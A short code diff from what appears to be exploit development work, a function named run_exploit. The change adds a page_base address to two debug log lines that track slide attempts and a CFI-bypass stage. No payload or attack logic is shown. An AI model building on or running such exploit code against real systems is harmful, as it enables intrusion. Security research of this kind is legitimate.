@@ -727,9 +727,9 @@ int run_exploit(int argc, char **argv) {
               attempt, fops_single_attempts);
     }
     pr_info("app fops slide attempt=%d/%d triggered=%d verified=%d "
-            "step=%d errno=%d\n",
+            "step=%d errno=%d base=%016zx\n",
             attempt, fops_single_attempts, triggered, verified,
-            cfi_last_step, cfi_last_errno);
+            cfi_last_step, cfi_last_errno, page_base);
     if (verified || cfi_dirty_seen) {
       break;
     }
@@ -752,8 +752,9 @@ int run_exploit(int argc, char **argv) {
 #endif
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
-            "step=%d errno=%d\n",
-            attempt, triggered, verified, cfi_last_step, cfi_last_errno);
+            "step=%d errno=%d base=%016zx\n",
+            attempt, triggered, verified, cfi_last_step, cfi_last_errno,
+            page_base);
     if (verified || cfi_dirty_seen) {
       break;
     }
